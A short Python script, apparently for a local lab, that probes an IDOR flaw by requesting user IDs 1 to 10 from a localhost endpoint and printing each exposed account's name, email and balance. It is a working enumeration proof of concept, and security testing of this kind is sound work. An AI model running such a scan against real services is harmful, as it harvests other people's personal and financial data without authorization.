import requests

BASE = "http://127.0.0.1:5000/user/"
FOUND = []

print("Scanning for exposed user data (IDOR)...\n")

for uid in range(1, 11):
    try:
        r = requests.get(BASE + str(uid), timeout=5)
        if r.status_code == 200 and "email" in r.text:
            data = r.json()
            FOUND.append(data)
            print(f"[VULNERABLE] ID: {data['id']} | Name: {data['name']} | Email: {data['email']} | Balance: {data['balance']}")
    except Exception as e:
        print("Error:", e)

print("\nScan complete. Total exposed accounts:", len(FOUND))
